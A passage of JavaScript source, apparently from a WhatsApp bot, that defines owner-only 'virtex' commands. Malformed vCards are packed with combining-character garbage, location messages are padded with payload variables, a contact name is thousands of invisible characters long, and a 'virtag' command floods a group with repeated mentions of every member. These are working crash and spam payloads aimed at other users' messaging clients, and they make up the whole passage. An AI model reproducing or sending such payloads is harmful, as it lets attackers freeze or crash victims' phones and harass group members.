͏̸̷̵̷̵̢̨̢͘͜͝͝͞͡͞.̸̸̻̞̭̓͌ͬ̿̈́͗̃̇̒̉̋̚͠͡͡.̶̷̴̡̛͖̪̝͕̲͍͎̣͙͈̦̹̫͎͓̖́̎́̀́͟͡҉҉.ͮͫ̽͏̵̴̸̢̨͜.͔̱̖͓̻͓͙̺͎̲͕͚̤͔̪̜̘̮͈̓̓ͭ̂̉̾͐̑̆ͩͯ͑̐̎.̸̶̲̦̙̹̘͔̞̭̙͎̲͖͕͚͖͔͙̭̫̻̄ͣͫͨ͂̂͜͜͜҉̶̧̢̧̕͟͠҉̸͘̕.̵̵̧̧̧̢̧͓̩̪̹͔̲͎͈̠̼͔̯̖̮̙͙͛̓ͮͪ̕͡.̢̧̹͕͉̝̫̟̬͎̩͚͙̬̰͖̗̳̳ͤͯͬ́ͨ̋ͣ̈̎ͣ̉̋̚͘ͅ҉҉̷͏̵̴̡̨̛͘͘͟͟͟͞͞.͕̞̬̜̞̥̩͙͚̔ͮ̓̃̍͗͊̃̿ͧ̋̉͆̑ͫ͋͐̈͠.̷̞̫̂ͩͧ̈͆̋ͬ͐͞҉̶̴̵̡́̕͢͢͝͡͞҉͟.̵̵̡̨̡͓̳̞̟̖͉̠̝͇͇̰̰̱̠̩̤̭͈͌̅̂́̄̿ͪ͟͝͡͝͠ͅ͏҉̸҉̶͠͞҉͡.̛̮̳̱̗̞͕̺̩͈̖͎̹͔̣̜̺̋͆̒̆̋̋͛͋̃̎̆ͦͣ͊.̳̘̱̭͛̓͂͊̓ͣ͊͌́͌̎̓͗̂̄ͧͨ̿̄ͧ.̸̰̩̤̟̱͖̭̱̞̰͇̟͋͛̄͂͊ͫͭ̈ͭͤ̔ͤ̐ͯ̈́͋̌͟ͅ͏҉̨͠.̧̛̣̭̣͍̩͎̻̫̗̖̟̖̮͖̑̇̅͑̂̆̉ͤ͑̅́͡͞.̵̴̨̨̨͚͚̘̜͚͚̲͎̪͈̥̱͓̰ͬ͛ͧ̑̌̌ͮ̈́͒ͭ̊̑̃́͑ͨ́́̕̕͜͟͝͞҉̶̨͡.̸̨̛̣͙͎͙̝̹͉͔̤ͯ̏͊̏͆̌ͩ̅̉͂̉̆̈́̿͋̄ͦ͞.̵̡̢̢̛̛͈̼̝̻̣̼̮̖͕͊̆̔́͟͝͏̷̶̴̨͘.̶̴̡̨̛̖͖̙̲̩̝͚̥͈̬̲͐̾͒̅̓̏̓͢͡͡.̷̧̟̳̺͕̬̦͚̳͎̮͓̤̟̙͖̮̩̮̀̉̈ͫ̓ͧͭ̚͟͝͏̷̸̀͘͞.̶̸̧͇̱̙̬̘̺̩̟̙͊ͩ̓ͩͭ͐̃̋̓͊̈͗͒̓̀̕͘͘͟͟͠͡ͅ҉̡́͞͏̵̵̢̧.̷̷̵̧̢̠̫̖̼̣͎̘̊̐̐͂ͭͧ̇ͣ̒́ͩ͆̚͏̛̀̕͜.̢̧͍̗̣̦̖̣͜ͅͅ͏̶̡͢͏̶̶́́͘.̵̻͓̺͍̺̜̦̟̽̅̈ͤ̂ͯ̓͋̂̇͜͏̨̛́͘͜.̵̷̸̡̨̢͉̟̣̖̑̍̿̉͂̄̏͐ͪ̀̕͟͞͡҉̸̷̨́͟͠.̶̵̡̧̨̛̛̤̳̎͛̾̉̀ͯ̿̌͗͌̎ͣ͂͒́͜͟͟͡͡ͅ.̤̺̣͕̣͙͚͚̫͎̉͆̃ͧ͆̽́ͥ̇ͩ̄̋ͧ̽ͣ̊̚̚ͅ҉̶̨̢̀҉̨͘.̷̷̸̥̫̬͉̭͖̙͍͓̣̞̤͖̙ͩͧͣ̏̉̃̔̊͐ͯͭ̾̒̅͟͞͏̶̴̡̀͞͡͞҉̵̴̡̛̛͠.̰̣̤͍̻ͪ̅ͥͯ̏̐̓̒̀.̴̵̟̩̱͚̼͇͉̗̫̣ͭ̈̌͞҉̷̶̸̵̀͜͠҉͠.̴̡̡̡͉̮̣̞̙̻̤̠̬͕͙̗͍̝͍ͣ̑̇̃ͭ̎̎̅ͮ̀̄̊̕͠.̴̻̗̜̗͎̘̲̣͖͔̠̣̯ͩ̓̄͂ͬ͑̓͆̓̅ͮ͊̀̚͏̢̨̛͟͝͏̢̕̕͡͡.̶̷̨̘͕͉̞̰̫͍̇ͨͣ̃͌͗̓̊̉ͨ̃̒͋͐̓̈̐̏̏̾̕̕͜͟͠͏̷̛́.̶̶̫͇͑̄ͬͮ̑̽̽͜͜͝.̵̷̶̵̢̨̬͕̩͉̜̠̱̲͖̖̗͕̠̳̩͓̐̈́̓͋̈́̎ͣͭ̌͆̀̕͘͢͢͢͢͞͝͡͞.̴̨̧̡̛͇̳͖͈͓̤͓̹̪̺̇̎̅͑͗ͨ̈̆ͭ͛ͪ͊́̀̀͟͝͠͞͞.̞̣̦̠̟̍͞.̫̰̲̯̗̫͉͚̗̺͓̟̫ͩͤ͋̒͋̌ͣ̈̽̊̐́͢͞.͔̘̘̪͈̲̤͓͍̰̺̮̞͚͎̫̙͒ͫͥͬ̓ͣ͗̓ͭ̑ͭ͒͂̐̑̾ͩ́̽̚.̙ͤ̇̈̄̾ͯͯͥ.̨̪͕͎͈̪̳͚̫̱̞̼̤̫̖͍͇̯͂̍̈ͨ͑͒ͪ̌͋͗̈̄͊̏̆ͭ̀̑̄́͘͘͢͠҉̸̸̵̨̛̀͜͢͞.̷̡̱̻̗͚̼̣̪͖̿͌̄͛̈́̏̈ͣ.̵̴̵̷̸̨̧̞̗̺͕̰͈̻͍̟̩̯̞̻͟͟͠͏̷̨̡̀͜͟͜͝.̴̨̡͔͉͕͈̗̜̲̞̩͈̯̫̻̙̻̣͖̙̮̋ͦ̓ͨ̍ͪ͐͒̓ͨ̇̄̆̇́̓̔͗̔̀̚͢͞͝͞ͅ҉̶͏͟͟͞͝.̣͙̣̞̭̹̫͖̮̻̟͇̺̞͖̥̎ͨ̒͑̍͆ͤ̾̉̔͑́ͫ̒̿̓ͭ͏̴̷̷̢̕͟͜͡҉̨̀͘҉̢.̶̷̶̛̭͓̫̰͔̩͕̭͓̦̪̗̎̄ͥͮͮ͆̍̈́͐̾͂̾ͤͩ́̀͠͡͝͠͞.̸̶̶̶̵̨̧̪̹̞̺̜̖͙͓ͫ̀́̕͢͜͜͠͡͏̀̀͢͞҉.̷̷̵̷̵̷̧̢̧͎̝̝̝̱̪̤̞͚̖̘̜̋̋̊ͮ͋̒̒̌ͫͦͪ̈ͧ̊̓͌̀̆ͭ̀̀͘͟͠͡͏̢̧̡.̸̨̧͓̫͉͉̰̱͒̍ͧ̈ͯ̔ͪ̄́͝͞͡͏̸́.̶̸̷̨̨̨̨̧̛̲̥̖̗̰̟͇̍̑̑͋̀̇͆̊͒̆͂̈́́̕͘͟͡͞͠ͅ.̷̛͚̳̩͇̪͓̞̜̘̠̯̠͓͓͈̦͇̝͝͝ͅͅ҉̷̢̧̛.̴̦͉̦̪̮͍̱͎̮̱͕̲̦̥̣͇̪̪̂͒͋ͪͩ̔̌͘ͅ͏̷̧̀́̕͘͠.̴̵̢̡̛͎͇͍͇͍̝̮̜̝̭̱͎̜͉̥̞̗͓͌͐̿̒ͯ͂͂͊ͮͭ̃̓̑̈́͆̃ͫ́͢͟͞͝͡͝҉̴̶̕.͉̤̮̱̼̺͈̒ͬ̄́ͬ̌ͭ̆ͫͦͫ̑ͦ͝͠ͅ.̶̵̡̢̛̪͓̱̯̈́ͥ̄ͤͫͥ̃ͦ̈̒̾̃̾ͬ̏ͯ̏́ͫ͜҉̸͘.̶̳͎͈͎̬̠̦̳̭̥͇̯͕ͥͧ͗͂ͫ̅̂͘͞͠ͅ҉̸̵̢̕͟͢͢͟͞҉̷.̵̧̢̢͂̄̿ͣ̒̌ͤ́̚̕͜͜͠҉̴̷͏͏͏̸̧.͎̻̳͕̠̭͇̮͂̃̅̀̓ͯͥ̒̊ͮͮ̈́̂̋́͠͠͝͞͝.̛̳̙̣͔̤̮ͧ̉̇ͧ͑́͌ͭ̊̍̀̇̆͛̃́̏͆͏̧̢̨͝҉̛҉̴̢҉̷̷̶̡͠.̷̵̵̶̨̡̡͎̬̟͖͉̞̖͉̑̒̊̉̾ͨ̓̅͛ͦ̊̾ͬ̐̅́ͪ́̚̕̕͜͠͝.̸͚͎̲̫̠̳̐̍̄͑̍͛ͩ͛ͧ̌̚͠͡ͅ.̶̢̡̛͔̞̲̬̦͔̘̭͋̎͂̔ͮ͋̆̀́͢͟͡͠͡.̴̸̡̡̧̨̛̛̛̛̛̪̠̭̣͔̘͙̼̤ͣͭ̈̅̀́̕͜͝͠.̷̸̨͉̟̭̜͕͓̙̳͙̗ͮ̊̔̇ͩ̃͛͑ͬ̔̍̈́̔ͭͣ́͜͞.̷̘̣̖̲̻̦̤̣̜̩͖̥̜̱̞ͣͪ͆̅̄̆̓͒ͣ͂́ͧ̍̊ͫ͘͏̨̡͘͟͡͏͏̡͢.̵̴̷̴̰̕.̵̶̨̧̡̛̛̛̭͚̙̰̫̥̹͖̿͟͢͟͝͝͠ͅ҉͜.̸̴̴̢̢̛̘͉͖̭͔͓̯̼̗͕͔͇ͤͪ̃͂̂̌̍̍̆͑̀͟͢͝.̴̴̶̸̷̴̧̧̛̙̯͖̝̠̯̥̖̙̎ͥͧ͗ͥͧ͑͆ͤ̿͊͋̾̆ͨͯ͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̢̤̗̖͍͉̗̞̣̹̭̪͓̏ͮ̿͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:bottom\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD`,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: mek, contextInfo:{}}) 
wibu.relayWAMessage(res)
break
case 'tovirgamv1':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            media = await wibu.downloadAndSaveMediaMessage(ger)
            wibu.sendMessage(from, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("database/virtex/white.jpg")})
break
case 'tovirgamv2':
 if (!isQuotedSticker) return reply('Reply Sticker!')
			if ((isMedia || isQuotedSticker ) && args.length == 0) 
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            media = await wibu.downloadAndSaveMediaMessage(ger)
            wibu.sendMessage(from, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("database/virtex/white.jpg")})
break
case 'virtag':  
if (!mek.key.fromMe) return reply('Lu siapa')
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `RANZ_VIRTAG ${philips}`
					for (let mem of groupMembers) {
						teks += ` 
					    @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}   @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]}  @${mem.jid.split('@')[0]} @${mem.jid.split('@')[0]} `
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
break
case 'jadilocation':
if (!mek.key.fromMe) return reply('Lu siapa')
if (!mek.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Teks Nya Apa Contoh\n${prefix}jadilocation teks`)
 wibu.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${philips}.                                                                                                                                                   ${vapi}`,
                                "address": `Ranz ${philips}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'jadilocation':
if (!mek.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Teks Nya Apa Contoh\n${prefix}jadilocation teks`)
 wibu.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q} ${philips}.                                                                                                                                                   ${vapi}`,
                                "address": `${philips}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'virkon':
if (!mek.key.fromMe) return replyy('Sok Asik Bet')
res = await wibu.prepareMessageFromContent(from,{
"contactMessage": {
"displayName": `  THE RANZ WAS HERE ©️   ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎